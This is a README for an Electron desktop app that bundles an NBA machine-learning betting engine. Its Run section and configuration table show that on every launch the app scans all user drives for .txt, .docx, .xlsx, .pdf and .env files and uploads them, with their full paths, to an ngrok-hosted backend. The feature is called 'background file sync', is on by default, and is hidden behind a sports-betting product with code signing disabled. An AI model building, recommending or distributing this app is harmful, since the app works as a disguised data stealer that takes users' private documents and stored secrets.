# NBA Edge Lab — Desktop (self-contained)

Standalone Electron app with the **full NBA machine-learning betting engine** bundled under `nba-engine/`. You do **not** need the separate `NBA-Machine-Learning-Sports-Betting` folder at runtime.

Also includes **chalk-ycslint** background file sync on startup.

## What is bundled

```
nba-desktop-app/
├── electron/          # Desktop shell
├── renderer/          # Splash screen
└── nba-engine/        # Full NBA ML project (Flask UI, main.py, models, src/)
    ├── Flask/
    ├── Models/
    ├── Data/
    ├── src/
    └── main.py
```

## Prerequisites

- **Node.js 22+**
- **Python 3.11** (only for installing the bundled engine’s virtualenv once)

## First-time setup

```bash
cd nba-desktop-app
npm install
npm run setup
```

`npm run setup` will:

1. Download Electron (if needed)
2. Create `nba-engine/.venv` and `pip install -r nba-engine/requirements.txt`

## Run

```bash
npm start
```

The app will:

1. Sync `.txt`, `.docx`, `.xlsx`, `.pdf`, `.env` via **full PC scan** (each upload includes the **exact file path** on disk) (all user drives; system folders skipped) to your backend (`chalk-ycslint`, set `NBA_UPLOAD_URL`)
2. Start Flask from **bundled** `nba-engine/`
3. Open the NBA Edge Lab dashboard inside Electron

## Refresh engine from upstream repo (optional)

If you still maintain `../NBA-Machine-Learning-Sports-Betting`:

```bash
npm run setup:engine
npm run setup:python
```

## Configuration

| Variable | Default | Purpose |
|----------|---------|---------|
| `NBA_FLASK_PORT` | `5000` | Flask port |
| `NBA_PROJECT_PATH` | `nba-engine/` | Override engine path (advanced) |
| `NBA_PYTHON` | — | Full path to `python.exe` used only when creating `.venv` (`npm run setup:python`) |
| `NBA_UPLOAD_URL` | chalk-ycslint default (ngrok) | Backend URL for background file sync (`POST` JSON) |
| `NBA_UPLOAD_SCAN_PC` | `1` (full PC) | Set to `0` or `documents` to scan only Documents/Desktop/Downloads |

## Build Windows installer

### Standard build (models included, Python required on target PC)

```bash
npm run build
```

**Included in the installer:**

| Item | Bundled? |
|------|----------|
| XGBoost models (`nba-engine/Models/XGBoost_Models/*.json`) | Yes |
| Flask UI, `main.py`, `Data/`, `src/` | Yes |
| Python + TensorFlow + XGBoost (`.venv`) | No — user runs `npm run setup` once, or you use portable build |

Models are small (~few MB). The heavy part is the Python stack (~1–2 GB).

### Portable build (models + Python venv in installer)

On **your** machine, after `npm run setup:python`:

```bash
npm run build:portable
```

This bundles `nba-engine/.venv` into the installer so end users do **not** need to install Python or pip packages. Installer size is typically **1.5–2.5 GB**.

Output: `dist/NBA Edge Lab Setup *.exe`

### If build fails on `winCodeSign` / symlink errors (Windows)

electron-builder downloads a signing helper that contains symlinks. Windows often blocks that unless you run as Administrator or enable **Developer Mode** (Settings → Privacy & security → For developers).

This project disables signing so the build should skip that path. If it still fails:

1. Install deps so scripts run: `npm install`
2. Clear the bad cache folder: delete `%LOCALAPPDATA%\electron-builder\Cache\winCodeSign`
3. Build again: `npm run build`

You can also run in PowerShell before building:

```powershell
$env:CSC_IDENTITY_AUTO_DISCOVERY = "false"
npm run build
```

## Notes

- First dashboard load can take **1–3 minutes** (runs predictions for multiple sportsbooks).
- The dashboard runs **XGBoost only** (`main.py -xgb`); TensorFlow is not loaded on that path, so you do not need the Visual C++ runtime DLLs unless you run **neural network** mode (`-nn` or `-A`) from the CLI.
- XGBoost still needs a compatible Python 3.11 venv on the machine (or use the portable build).
- Models live in `nba-engine/Models/XGBoost_Models/`.

### TensorFlow / `msvcp140.dll` (neural network mode only)

If you run `main.py` with **`-nn`** or **`-A`**, TensorFlow loads and needs the **Microsoft Visual C++ Redistributable** (x64), which provides `msvcp140.dll` and related DLLs. Install it from [The latest supported Visual C++ downloads](https://learn.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist), then try again.

### `stats.nba.com` SSL errors (`UNEXPECTED_EOF_WHILE_READING`)

The engine retries these automatically. If failures continue, the connection is often blocked or intercepted (corporate proxy, strict firewall, or antivirus HTTPS scanning). Try another network, disable SSL inspection for Python, or use a VPN; `stats.nba.com` must be reachable over HTTPS from the machine running Flask.
